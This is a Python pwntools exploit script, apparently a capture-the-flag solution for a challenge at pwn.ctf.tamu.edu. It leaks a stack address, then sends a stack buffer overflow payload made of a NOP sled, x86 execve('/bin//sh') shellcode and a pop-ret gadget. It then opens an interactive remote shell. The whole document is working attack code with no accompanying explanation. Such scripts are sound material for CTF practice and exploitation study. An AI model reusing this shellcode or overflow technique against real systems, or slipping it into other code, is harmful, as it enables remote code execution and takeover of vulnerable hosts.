from pwn import *
import struct

SHELLCODE  = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80\xC3"
NOPS       = "\x90"*(242-len(SHELLCODE))
POP_RET    = p32(0x804833a) 

#r = process('./pwn3')
r = remote('pwn.ctf.tamu.edu', 4323)

def writeToFile(payload):
    with open('temp', 'a') as the_file:
    	the_file.write(payload)

def stackAddress():
    r.recvuntil('0x')
    address = r.recvuntil('!')
    address = address.split('!')[0]
    address = int(address, 16)
    address = p32(address)
    return address

def pwn():
    address = stackAddress()
    payload = NOPS + SHELLCODE + POP_RET + address
    writeToFile(payload)
    print r.recvuntil('Now what should I echo? ')
    r.sendline(payload)
    r.interactive()

if __name__ == "__main__":
    pwn()
